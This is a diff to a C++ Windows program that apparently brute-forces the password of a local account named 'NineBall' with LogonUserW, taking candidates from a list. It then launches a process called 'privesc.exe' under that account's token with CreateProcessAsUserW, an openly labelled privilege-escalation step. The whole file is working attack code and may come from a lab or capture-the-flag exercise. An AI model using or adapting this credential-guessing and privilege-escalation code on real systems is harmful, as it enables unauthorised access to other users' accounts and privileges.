@@ -25,7 +25,7 @@ int wmain() {
 	file.close();
 
 	// attempt to authenticate as NineBall with passwords
-	HANDLE hToken;
+	HANDLE hToken = NULL;
 	for(std::wstring s : passList) {
 		std::wcout << L"\"" << s << L"\"" << std::endl;
 		if (LogonUserW(
@@ -41,7 +41,32 @@ int wmain() {
 		}
 	}
 
+	if (hToken == NULL || hToken == INVALID_HANDLE_VALUE) {
+		std::wcout << L"failed to get NineBall token" << std::endl;
+	}
+
 	std::wcout << L"pass: \"" << pass << L"\"" << std::endl;
 
 	// create privesc process as NineBall
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (!CreateProcessAsUserW(
+		hToken,
+		L"privesc.exe",
+		NULL,
+		NULL,
+		NULL,
+		FALSE,
+		0,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	)) {
+		std::wcout << L"couldn't create privesc process" << std::endl;
+	}
 }
